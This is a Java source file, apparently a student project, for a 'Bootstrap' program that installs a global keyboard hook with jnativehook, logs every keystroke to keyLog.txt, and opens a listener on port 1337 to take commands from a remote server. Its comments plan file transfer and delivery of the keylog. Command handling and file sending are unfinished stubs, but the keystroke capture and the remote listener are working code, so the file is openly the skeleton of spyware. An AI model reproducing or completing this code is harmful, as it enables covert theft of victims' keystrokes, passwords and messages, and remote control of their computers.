package edu.wit.comp2100;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import java.io.*;
import java.lang.annotation.Native;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.nio.file.Path;

public class Bootstrap {

    private static final Path DEFAULT_KEYLOG_PATH = null; //TODO decide on default path
    private static final Path DEFAULT_FILE_PATH = null; //TODO reference path where bootstrap is running/stored
    private static File lastReceivedFile;
    private static File keyLogFile;

    //listens for commands from the server like opening a file transfer socket and sending the keylogger
    private static ServerSocket serverSocket;
    private static final int LISTENPORT = 1337;
    private static Socket socket;

    /*
    Starts listener thread
     */
    public static void main(String[] args) throws IOException{

        start();

    }

    /*
     Starts listener thread
     Listener thread will take input from socket
     Create string array from input
     Pass string array to parseCommand
      */
    private static void start() throws IOException{

        //TODO: implement this method

        keyLogFile = new File("keyLog.txt");
        System.out.println("Keylog file created: " + keyLogFile.createNewFile() +
                "\n Starting keylogger... ");

        startKeylogger(keyLogFile);

        listen();

    }


    /*
    very convoluted method that listens for a command from the server

    will check if socket was closed and reopen if so (since server will
    be closing and reopening connections on occasion
     */
    private static void listen() throws IOException{

        serverSocket = new ServerSocket(LISTENPORT);
        socket = serverSocket.accept();

        new Thread(){

            public void run(){

                while (true){
                    try{
                        if (socket.isClosed()){
                            try {
                                socket = serverSocket.accept();
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                            System.out.println("Socket reopened and listening");
                        } else {
                            try{
                                //take input from socket indefinitely and output to terminal.
                                InputStream inputStream = socket.getInputStream();
                                DataInputStream dataInputStream = new DataInputStream(inputStream);

                                //parse command sent from server
                                String sentence = dataInputStream.readUTF();
                                parseCommand(sentence);

                            } catch (EOFException e) {
                                System.out.println("SYSTEM: Connection closed by client.");
                                socket.close();
                            } catch (SocketException s){
                                System.out.println("SYSTEM: Connection closed.");
                                socket.close();
                            } catch (IOException e){
                                System.out.println("IOEXCEPTION");
                                socket.close();
                            }
                        }
                    } catch (IOException io){
                        System.err.println("io exception caused from listener socket");
                        io.printStackTrace();
                    }
                }
            }
        }.run();
    }

    /*
    Listen invokes this method when it receives a message over the socket
    preforms actions based on arguments
     */
    private static void parseCommand(String recievedCommand){
        //TODO: implemnt this method
        //split command into an array of words.
        //parse command based on array.

        //for now lets just print the command
        System.out.println(recievedCommand);


    }

    /*
    Starts global key-logger thread
    thread will take input-stream from keyboard
    and input it into a file
     */
    private static void startKeylogger(File keyLogFile) throws IOException {

        try{
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e){
            System.err.println("Problem registering native hook");
            System.err.println(e.getMessage());

           System.exit(1);
        }

        GlobalScreen.addNativeKeyListener(new KeyLogger(keyLogFile)); //TODO IOException could be thrown here


    }

    /*
    Wrapper method to put received files in pre-defined path
     */

    private void sendFile(String path){

    }



}
